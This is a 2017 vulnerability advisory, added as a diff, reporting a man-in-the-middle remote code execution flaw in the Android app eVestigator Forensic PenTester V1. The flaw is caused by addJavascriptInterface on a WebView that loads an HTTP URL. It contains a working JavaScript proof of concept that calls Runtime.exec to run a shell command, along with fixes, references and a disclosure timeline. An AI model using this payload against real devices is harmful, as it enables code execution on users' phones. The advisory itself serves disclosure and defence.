@@ -1,0 +1,103 @@
+# Exploit Title: eVestigator Forensic PenTester v1 - Remote Code Execution via MITM
+# Date: 30/Jun/17
+# Exploit Author: MaXe
+# Vendor Homepage: https://play.google.com/store/apps/details?id=penetrationtest.eVestigator.com
+# Software Link: See APK archive websites
+# Screenshot: Refer to https://www.youtube.com/watch?v=cTu7yKTp8vc
+# Version: V1
+# Tested on: Android 4.0.3 (Google APIs) - API Level 15 - x86
+# CVE : N/A
+
+eVestigator Forensic PenTester - Remote Code Execution via MITM
+
+Version affected: V1
+
+App Info: The Android application reviewed, according to the developer, performs a "thorough forensic level Penetration Test". During run-time and reverse engineering analysis, it was discovered that the application does a connect() scan (i.e. TCP 3-way handshake) to all 65535 TCP ports, for the external IP address of the app user, with 10 simultaneous threads. However, in case a target has all 65535 TCP ports open, the application will actually report that there are 87375 "threats" (i.e. ports) open. Even after scanning all the ports, the application will continue to run forever, and for example count down from the same minute several times. (i.e. when the timer hits 14:00, it goes back up to 14:59)
+
+The application does not report to the user which ports are open, and it does not provide a final report either. Nor does it even attempt to grab any service banners. If the "Send to eVestigator" button is clicked, none of the scan details are sent either. Instead, the external IP address along with other details about the Android environment + user-entered details are sent.
+
+External Links:
+https://play.google.com/store/apps/details?id=penetrationtest.eVestigator.com
+https://www.amazon.com/eVestigator-Forensic-PenTester-Computer-Digital/dp/B01IF52TAU
+
+
+Credits: MaXe (@InterN0T)
+Special Thanks: no1special
+Shouts: SubHacker and the rest of the awesome infosec community.
+
+
+-:: The Advisory ::-
+The Android application is vulnerable to Remote Code Execution via Man-In-The-Middle (MITM) attacks. This is caused by the following lines of code within the \penetrationtest\eVestigator\com\main.java file: (Lines 1589-1592)
+    mostCurrent._webview1.Initialize(mostCurrent.activityBA, "Webview1");
+    mostCurrent._webview1.Loadproton-Url("http://api.ipify.org/?format=txt");
+    WebViewExtras webViewExtras = mostCurrent._webviewextras1;
+    WebViewExtras.addJavascriptInterface(mostCurrent.activityBA, (WebView) mostCurrent._webview1.getObject(), "B4A");
+
+In addition to the above, the following App configuration also aids in the exploitability of this issue: (File: AndroidManifest.xml, Line: 3)
+    <uses-sdk android:minSdkVersion="5" android:targetSdkVersion="19" />
+
+If an attacker performs a MITM attack against "api.ipify.org" by e.g. hijacking the domain name, DNS, IP prefix, or by serving a malicious wireless access point (or hijacking a legitimate one), or by hacking the server at "api.ipify.org", then the attacker can instruct the Android application to execute attacker controlled Java code that the phone will execute in the context of the application.
+
+The root cause of this vulnerability is caused by addJavascriptInterface() within the WebViewer, which in older API versions can be used to execute arbitrary Java code by using reflection to a ccess public methods with attacker provided JavaScript.
+
+
+-:: Proof of Concept ::-
+A successful MITM attack that makes "api.ipify.org" serve the following code:
+  <script>
+  function execute(cmd){
+    return B4A.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmd);
+  }
+  document.write(execute(['/system/bin/sh','-c','echo test > /data/data/penetrationtest.eVestigator.com/hax0r1tn0w']));
+  </script>
+
+Will make the Android application create a new file in the App directory named: hax0r1tn0w
+
+Instead of creating a new file, the attacker can also use the "drozer" payload for example. Refer to the references further below.
+
+
+-:: Solution ::-
+The Android app code should not use the addJavaScriptInterface() function. Instead the following code should be used:
+    WebView webView = new WebView(this);
+    setContentView(webView);
+    ...
+Alternatively, the application manifest should specify API levels JELLY_BEAN_MR1 and above as follows:
+    <manifest>
+    <uses-sdk android:minSdkVersion="17" />
+    ...
+    </manifest>
+
+The URL used ("http://api.ipify.org/?format=txt") should ALSO use HTTPS (and verify the hostname and certificate properly), because an attacker performing a MITM attack can otherwise force the application into scanning any target that the attacker desires. The URL used to get the external IP address of the user, should also be hosted by the developer and not a third party.
+
+
+References:
+http://50.56.33.56/blog/?p=314
+https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)
+https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/
+https://labs.mwrinfosecurity.com/advisories/webview-addjavascriptinterface-remote-code-execution/
+https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=129859614
+
+Filename: penetrationtest.eVestigator.com_2016-07-11.apk
+File size: 1062059 Bytes
+
+md5: FD4ACC4133526BE8106836D69867F9C1
+sha1: C92D5184ABEFDBE12D53EBE2ADCE2CFABAB96E60
+sha256: 12219EF02C714ECC8F3247D38EFC0E7DF36A9EA9C71507D7984D2C04E31CCE0B
+
+App Name: eVestigator Simon Smith Forensics - PenTester
+Package Name: penetrationtest.eVestigator.com
+Package Version: V1
+
+=== EOF ===
+
+Video demo:
+https://www.youtube.com/watch?v=cTu7yKTp8vc
+
+Full POC Archive:
+https://mega.nz/#!MHYjVCTZ!4rZhT99mi0-uTDmc_nA9sT0-xQeK-O_InYWWvMdVBFk
+
+The following is the disclosure timeline:
+25 June 2017 - Vendor is notified.
+25 June 2017 - Vendor sends several threats of prosecution to InterN0T.
+26 June 2017 - Vendor pulls apps from app store and does not intend to fix vulnerabilities.
+29 June 2017 - Vendor files privacy and trademark complaints with YouTube.
+30 June 2017 - All disclosure websites notified, including Exploit-DB.
